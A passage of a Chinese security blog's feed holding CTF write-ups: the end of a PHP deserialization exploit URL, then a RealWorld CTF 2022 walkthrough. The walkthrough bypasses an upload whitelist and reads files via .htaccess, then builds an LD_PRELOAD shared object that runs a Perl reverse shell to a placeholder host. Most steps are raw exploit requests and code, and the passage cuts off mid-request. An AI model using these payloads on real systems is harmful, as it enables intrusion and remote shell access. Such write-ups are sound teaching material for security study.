class="comment">//eci-2ze2703izi264xoty36f.cloudeci1.ichunqiu.com/index.php?game=O:3:%22One%22:1:&#123;s:5:%22count%22;O:6:%22abaaba%22:1:&#123;S:11:%22\00*\00DoNotGet%22;O:8:%22suhasuha%22:2:&#123;S:16:%22\00suhasuha\00Giveme%22;s:1:%22a%22;s:6:%22action%22;a:2:&#123;i:0;O:7:%22Onemore%22:1:&#123;s:4:%22file%22;s:29:%22/../%00../%00../%00../%00../%00../%00flag%22;&#125;i:1;s:8:%22readfile%22;&#125;&#125;&#125;&#125;</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220827/JIe5thoap6R6.png?imageslim" alt="mark"></p><p><code>flag{ce096f24-8fe5-41f0-b7ad-12c7c7b57235}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2022网鼎杯白虎组-web-php反序列化&quot;&gt;&lt;a href=&quot;#2022网鼎杯白虎组-web-php反序列化&quot; class=&quot;headerlink&quot; title=&quot;2022网鼎杯白虎组-web-php反序列化&quot;&gt;&lt;/a&gt;2022网鼎杯白虎组-web-php反序
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>RealWorld2022 RWDN复现总结</title>
    <link href="https://c1aysec.github.io/2022/01/27/RealWorld2022%20RWDN%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/"/>
    <id>https://c1aysec.github.io/2022/01/27/RealWorld2022 RWDN复现总结/</id>
    <published>2022-01-27T07:51:56.605Z</published>
    <updated>2022-02-23T08:34:00.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RealWorld2022-RWDN复现总结"><a href="#RealWorld2022-RWDN复现总结" class="headerlink" title="RealWorld2022 RWDN复现总结"></a>RealWorld2022 RWDN复现总结</h1><p><a href="http://47.243.75.225:31337/" target="_blank" rel="external">http://47.243.75.225:31337/</a></p><p>打开后是一个上传页面</p><p><img src="http://pic.c1imber.top/blog/20220127/ISr5uL1HkVdB.png?imageslim" alt="mark"></p><p>尝试上传漏洞未果，上传的文件地址：<a href="http://47.243.75.225:31338/md5值/文件名" target="_blank" rel="external">http://47.243.75.225:31338/md5值/文件名</a></p><p>主页有一个/readflag提示</p><p><img src="http://pic.c1imber.top/blog/20220127/PvB0q1xVg0Ty.png?imageslim" alt="mark"></p><p>访问<a href="http://47.243.75.225:31337/source" target="_blank" rel="external">http://47.243.75.225:31337/source</a></p><p>可以获取源码，后端是nodejs，代码如下</p><p>server.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</div><div class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">'express-fileupload'</span>);</div><div class="line"><span class="keyword">const</span> md5 = <span class="built_in">require</span>(<span class="string">'md5'</span>);</div><div class="line"><span class="keyword">const</span> &#123; <span class="attr">v4</span>: uuidv4 &#125; = <span class="built_in">require</span>(<span class="string">'uuid'</span>);</div><div class="line"><span class="keyword">const</span> check = <span class="built_in">require</span>(<span class="string">'./check'</span>);</div><div class="line"><span class="keyword">const</span> app = express();</div><div class="line"></div><div class="line"><span class="keyword">const</span> PORT = <span class="number">8000</span>;</div><div class="line"></div><div class="line">app.set(<span class="string">'views'</span>, __dirname + <span class="string">'/views'</span>);</div><div class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>);</div><div class="line"></div><div class="line">app.use(fileUpload(&#123;</div><div class="line">  useTempFiles : <span class="literal">true</span>,</div><div class="line">  tempFileDir : <span class="string">'/tmp/'</span>,</div><div class="line">  createParentPath : <span class="literal">true</span></div><div class="line">&#125;));</div><div class="line"></div><div class="line">app.use(<span class="string">'/upload'</span>,check());</div><div class="line"></div><div class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (req.query.checkin)&#123;</div><div class="line">    res.sendfile(<span class="string">'/src/check.js'</span>);</div><div class="line">  &#125;</div><div class="line">  res.sendfile(<span class="string">'/src/server.js'</span>);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> formid = <span class="string">"form-"</span> + uuidv4();</div><div class="line">  res.render(<span class="string">'index'</span>, &#123;<span class="attr">formid</span> : formid&#125; );</div><div class="line">&#125;);</div><div class="line"></div><div class="line">app.post(<span class="string">'/upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> sampleFile;</div><div class="line">  <span class="keyword">let</span> uploadPath;</div><div class="line">  <span class="keyword">let</span> userdir;</div><div class="line">  <span class="keyword">let</span> userfile;</div><div class="line">  sampleFile = req.files[req.query.formid];</div><div class="line">  userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);</div><div class="line">  userfile = sampleFile.name.toString();</div><div class="line">  <span class="keyword">if</span>(userfile.includes(<span class="string">'/'</span>)||userfile.includes(<span class="string">'..'</span>))&#123;</div><div class="line">      <span class="keyword">return</span> res.status(<span class="number">500</span>).send(<span class="string">"Invalid file name"</span>);</div><div class="line">  &#125;</div><div class="line">  uploadPath = <span class="string">'/uploads/'</span> + userdir + <span class="string">'/'</span> + userfile;</div><div class="line">  sampleFile.mv(uploadPath, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (err) &#123;</div><div class="line">      <span class="keyword">return</span> res.status(<span class="number">500</span>).send(err);</div><div class="line">    &#125;</div><div class="line">    res.send(<span class="string">'File uploaded to http://47.243.75.225:31338/'</span> + userdir + <span class="string">'/'</span> + userfile);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">app.listen(PORT, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'Express server listening on port '</span>, PORT);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>根据server.j代码的提示，访问/source?checkin=xxx，获取check.js的源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</div><div class="line">      <span class="keyword">if</span> ( !req.query.formid || !req.files || <span class="built_in">Object</span>.keys(req.files).length === <span class="number">0</span>) &#123;</div><div class="line">        res.status(<span class="number">400</span>).send(<span class="string">'Something error.'</span>);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">      &#125;</div><div class="line">      <span class="built_in">Object</span>.keys(req.files).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>)</span>&#123;</div><div class="line">        <span class="keyword">var</span> filename = req.files[key].name.toLowerCase();</div><div class="line">        <span class="keyword">var</span> position = filename.lastIndexOf(<span class="string">'.'</span>);</div><div class="line">        <span class="keyword">if</span> (position == <span class="number">-1</span>) &#123;</div><div class="line">          <span class="keyword">return</span> next();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">var</span> ext = filename.substr(position);</div><div class="line">        <span class="keyword">var</span> allowexts = [<span class="string">'.jpg'</span>,<span class="string">'.png'</span>,<span class="string">'.jpeg'</span>,<span class="string">'.html'</span>,<span class="string">'.js'</span>,<span class="string">'.xhtml'</span>,<span class="string">'.txt'</span>,<span class="string">'.realworld'</span>];</div><div class="line">        <span class="keyword">if</span> ( !allowexts.includes(ext) )&#123;</div><div class="line">          res.status(<span class="number">400</span>).send(<span class="string">'Something error.'</span>);</div><div class="line">          <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> next();</div><div class="line">      &#125;);</div><div class="line">    &#125;;</div><div class="line">  &#125;;</div></pre></td></tr></table></figure><p>根据代码逻辑可知，在上传文件时，对应server.js的<code>/upload</code>接口，会首先经过check.js的检查，check.js当中先检查了get参数formid是否为空、是否存在上传文件，接着会遍历上传文件，获取文件名，对后缀进行白名单检查，如果不符合要求，就直接返回400状态码打印Something error. 符合要求就返回<code>next()</code>，进入server.js的<code>/upload</code>路由</p><p>在server.js的<code>/upload</code>路由当中获取到name为<code>req.query.formid</code>的文件，然后根据<code>md5(md5(req.socket.remoteAddress) + sampleFile.md5)</code>生成上传目录，将文件上传到生成的目录下，这里文件名当中不能有..和/，否则会返回Invalid file name，上传的文件会同步到31338端口的apache下</p><p><strong>绕过：</strong></p><p>因为check.js当中是依次遍历上传文件的，所以这里可以通过多文件上传绕过对后缀的检测，因为目录名受<code>sampleFile.md5</code>的影响，所以可以先上传正常文件获取目录名，再进行多文件上传</p><p><strong>step1：</strong></p><p>上传白名单后缀文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">POST /upload?formid=aaa HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">47.243</span><span class="number">.75</span><span class="number">.225</span>:<span class="number">31337</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Length: 221</span></div><div class="line"><span class="comment">Origin: http://47.243.75.225:31337</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Referer: http://47.243.75.225:31337/</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="aaa"; filename="111.txt"</span></div><div class="line"><span class="comment">Content-Type: text/plain</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">111</span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220127/HKb29wBNSUGM.png?imageslim" alt="mark"></p><p>获取上传目录：6ef9ccdc30059c526a93f6f15f9f634d</p><p><strong>step2</strong></p><p>多文件上传，这里将上传的第二个文件的name设置为和<code>req.query.formid</code>值aaa一致，这样在check.js对上传文件进行遍历时会先获取到name为bbb的文件，符合白名单后返回<code>next()</code>，进入server.js <code>/upload</code>的上传逻辑，获取到name值为aaa的文件进行上传，这样就可以成功绕过后缀检测上传想要上传的文件了（需要注意两个文件内容必须一致，不然<code>sampleFile.md5</code>会变，上传目录也会变）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">POST /upload?formid=aaa HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">47.243</span><span class="number">.75</span><span class="number">.225</span>:<span class="number">31337</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Length: 379</span></div><div class="line"><span class="comment">Origin: http://47.243.75.225:31337</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Referer: http://47.243.75.225:31337/</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="bbb"; filename="111.txt"</span></div><div class="line"><span class="comment">Content-Type: text/plain</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">111</span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="aaa"; filename="111.php"</span></div><div class="line"><span class="comment">Content-Type: text/plain</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">111</span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220127/SjP0WLTvKo3x.png?imageslim" alt="mark"></p><p>可以看的这里虽然返回Something error.，但是111.php上传成功了</p><p><img src="http://pic.c1imber.top/blog/20220127/pEMCxwYq21Yy.png?imageslim" alt="mark"></p><p>这里返回Something error.的是因为第二次遍历到了name为aaa的文件后缀不在白名单之内，但是在此之前我们的文件在第一波后缀检测后就已经进入server.js的<code>/upload</code>路由上传成功了</p><p>这里的apache环境解析不了php，所以可以先通过上传.htaccess进行任意文件读取</p><p><code>ErrorDocument 404 &quot;%{file:/etc/apache2/apache2.conf}&quot;</code></p><p>Apache HTTP服务器中的表达式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">variable    ::= &quot;%&#123;&quot; varname &quot;&#125;&quot;</div><div class="line">             | &quot;%&#123;&quot; funcname &quot;:&quot; funcargs &quot;&#125;&quot;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220223/IQwHlxXjhkgV.png?imageslim" alt="mark"></p><p><strong>step1：</strong></p><p>获取上传目录</p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">POST /upload?formid=aaa HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">47.243</span><span class="number">.75</span><span class="number">.225</span>:<span class="number">31337</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Length: 271</span></div><div class="line"><span class="comment">Origin: http://47.243.75.225:31337</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Referer: http://47.243.75.225:31337/</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="aaa"; filename="111.txt"</span></div><div class="line"><span class="comment">Content-Type: text/plain</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">ErrorDocument 404 "%&#123;file:/etc/apache2/apache2.conf&#125;"</span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220127/eqk1pt2yplRh.png?imageslim" alt="mark"></p><p>上传目录：0a1a1a3e8607712856d33e49fb7b8af6</p><p><strong>step2：</strong></p><p>上传恶意.htaccess</p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">POST /upload?formid=aaa HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">47.243</span><span class="number">.75</span><span class="number">.225</span>:<span class="number">31337</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Length: 481</span></div><div class="line"><span class="comment">Origin: http://47.243.75.225:31337</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Referer: http://47.243.75.225:31337/</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="bbb"; filename="111.txt"</span></div><div class="line"><span class="comment">Content-Type: text/plain</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">ErrorDocument 404 "%&#123;file:/etc/apache2/apache2.conf&#125;"</span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="aaa"; filename=".htaccess"</span></div><div class="line"><span class="comment">Content-Type: text/plain</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">ErrorDocument 404 "%&#123;file:/etc/apache2/apache2.conf&#125;"</span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220127/A9cw92gmli2m.png?imageslim" alt="mark"></p><p><strong>step3：</strong></p><p>访问404页面即可读取.htaccess当中设置的文件</p><p><img src="http://pic.c1imber.top/blog/20220127/rIqMHTj5DzKG.png?imageslim" alt="mark"></p><p>看到这里配置文件当中设置了<code>ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip</code>，通过wp学习到可以通过<code>SetOutputFilter</code>加载恶意so文件执行命令</p><p><strong>关于apache的mod_ext_filter</strong></p><p>官方文档描述：<br>Description:Pass the response body through an external program before delivery to the client</p><p>可以理解为Apache中间件与客户端（浏览器）之间的一个过滤器，两者之间的传输流会先经过该过滤器处理</p><p>使用：</p><p>ExtFilterDefine：定义一个过滤器</p><p><img src="http://pic.c1imber.top/blog/20220223/gfrNmieylrJt.png?imageslim" alt="mark"></p><p>参数：</p><p>mode：定义要处理的流，input/output</p><p>cmd：定义过滤器的处理程序</p><p>SetOutputFilter：选择一个已定义的过滤器使用</p><p>因为在SetOutputFilter时，会新启动ExtFilterDefine当中设置的进程，所以可以使用LD_PRELOAD加载so执行命令</p><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。</p><p>mod_ext_filter测试：</p><p>对应so文件/usr/lib/apache2/modules/mod_ext_filter.so，默认就是存在的，使用前需要先开启该模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s /etc/apache2/mods-available/ext_filter.load /etc/apache2/mods-enabled/ext_filter.load</div></pre></td></tr></table></figure><p><strong>mod_env</strong></p><p>setEnv 设置环境变量</p><p><strong>step4：</strong></p><p>编译恶意so文件并上传</p><p>evil.so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</div><div class="line">    system(<span class="string">"perl -e 'use Socket;$i=\"VPS\";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;'"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc evil.c -shared -fPIC -o evil.so</div></pre></td></tr></table></figure><p>上传恶意so，后缀txt就可以</p><p><img src="http://pic.c1imber.top/blog/20220127/Q7op08XSge3n.png?imageslim" alt="mark"></p><p>so文件地址：<br>/var/www/html/63e27c261f8f794877cee77be7ec3c73/evil.txt</p><p><strong>step5：</strong></p><p>SetOutputFilter加载恶意so文件执行命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">POST /upload?formid=aaa HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">47.243</span><span class="number">.75</span><span class="number">.225</span>:<span class="number">31337</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Length: 323</span></div><div class="line"><span class="comment">Origin: http://47.243.75.225:31337</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Referer: http://47.243.75.225:31337/</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="aaa"; filename="111.txt"</span></div><div class="line"><span class="comment">Content-Type: text/plain</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">SetEnv LD_PRELOAD /var/www/html/63e27c261f8f794877cee77be7ec3c73/evil.txt</span></div><div class="line"><span class="comment">SetOutputFilter 7f39f8317fgzip</span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392--</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20220127/xPKqtD7P038C.png?imageslim" alt="mark"></p><p>获得上传目录：717f225e1bd598e5b51f07535d55627f，进行多文件上传</p><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">POST /upload?formid=aaa HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">47.243</span><span class="number">.75</span><span class="number">.225</span>:<span class="number">31337</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Length: 585</span></div><div class="line"><span class="comment">Origin: http://47.243.75.225:31337</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Referer: http://47.243.75.225:31337/</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="bbb"; filename="111.txt"</span></div><div class="line"><span class="comment">Content-Type: text/plain</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">SetEnv LD_PRELOAD /var/www/html/63e27c261f8f794877cee77be7ec3c73/evil.txt</span></div><div class="line"><span class="comment">SetOutputFilter 7f39f8317fgzip</span></div><div class="line"><span class="comment">-----------------------------245630263842877629631739221392</span></div><div class="line"><span class="comment">Content-Disposition: form-data; name="aaa"; filename=".htaccess"</span></div><div class="line"><span class="comment">Content-Type: text/plain</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">SetEnv LD_PRELOAD /var/www/html/63e27c261f8f794877cee77be7ec3c73/evil.txt</span></div><div class="line"><span class="comment">SetOutputFilter 7f39f8317fgzip</span></div><div 